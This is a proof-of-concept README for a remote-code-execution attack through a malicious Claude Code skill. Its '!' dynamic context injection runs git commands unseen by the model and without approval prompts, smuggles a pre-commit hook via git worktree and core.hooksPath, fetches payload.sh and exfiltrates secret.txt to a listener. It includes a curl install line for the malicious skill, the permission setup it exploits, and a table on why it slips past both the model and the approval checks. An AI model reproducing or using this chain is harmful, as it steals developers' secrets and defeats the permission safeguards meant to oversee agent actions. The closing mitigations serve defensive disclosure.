# RCE via Dynamic Context Injection

PoC: silent RCE when a victim loads a malicious Claude Code skill, using `!` dynamic context injection and git hook smuggling.

## How it works

Claude Code skills support `` !`command` `` injection — shell commands that execute **before** Claude sees anything, with their stdout injected as context. Combined with git's `core.hooksPath`, this enables RCE with zero approval prompts.

**Attack chain:**
```
Victim: "can you review my code?"
  → Claude matches description, loads code-review skill
  → !` injection fires (preprocessing — invisible to Claude)
      → git fetch        pull hook from poc-payload branch
      → git worktree add check out hook with executable bit intact
      → git config       redirect git hooks lookup to the worktree
      → git commit       trigger the pre-commit hook
          → hook fetches payload.sh from main and runs it
          → payload.sh exfiltrates secret.txt to localhost:9292
  → Claude returns a normal-looking code review
```

Claude never sees the commands. Victim approves nothing. Output shows `✓ Standards synchronized`.

## Reproduce

### Attacker

```bash
gitar webhook -b
# listening on :9292
```

### Victim

**Prerequisite:** victim's `.claude/settings.json` must have `Bash(git:*)` allowed and `Bash(git push:*)` denied — the most common developer setup: allow all git operations, prevent accidental pushes.

Set up the settings (or ensure your existing `.claude/settings.json` matches):
```bash
mkdir -p ~/.claude && cat > ~/.claude/settings.json << 'EOF'
{
  "permissions": {
    "allow": [
      "Bash(git:*)"
    ],
    "deny": [
      "Bash(git push:*)"
    ]
  }
}
EOF
```

Install the skill (one command — the social engineering vector):
```bash
mkdir -p ~/.claude/skills/code-review && \
  curl -fsSL https://raw.githubusercontent.com/ariary/malicious-claude/main/malicious-skill/dynamic-context-injection/victim/.claude/skills/code-review/SKILL.md \
  -o ~/.claude/skills/code-review/SKILL.md
```

Then in a git repo with a `secret.txt`. The attack requires a proper git root — two options:

**Option A — use the provided `victim/` directory:**
```bash
cd victim
git init && git add . && git commit -m "init"
claude
```

**Option B — use a temporary directory:**
```bash
mkdir /tmp/victim-repo && cd /tmp/victim-repo
git init
echo "super_secret_api_key=abc123" > secret.txt
git add . && git commit -m "init"
claude
```

Then:
> can you review my code?

### Result

Listener receives:
```json
{"host":"victims-machine","user":"alice","data":"c3VwZXJfc2VjcmV0..."}
```
```bash
echo "c3VwZXJfc2VjcmV0..." | base64 -d
```

## Why it works

| Property | Detail |
|---|---|
| Invisible to Claude | `!` injection runs at preprocessing — Claude only sees stdout |
| No approval prompts | All commands start with `git`, matched by `Bash(git:*)` |
| Executable bit preserved | `git worktree add` checks out files with their stored mode (100755) |
| Legitimate-looking | Output says `✓ Standards synchronized`; victim gets a real code review |
| Stager / payload split | `payload.sh` lives on `main` — update anytime without touching the victim-fetched branch |

## Mitigations

- Treat skill files like executable code — audit before installing
- Avoid broad allow rules like `Bash(git:*)` in `.claude/settings.json`
- Audit `~/.claude/skills/` regularly
- Anthropic: require explicit approval for `!` injection commands
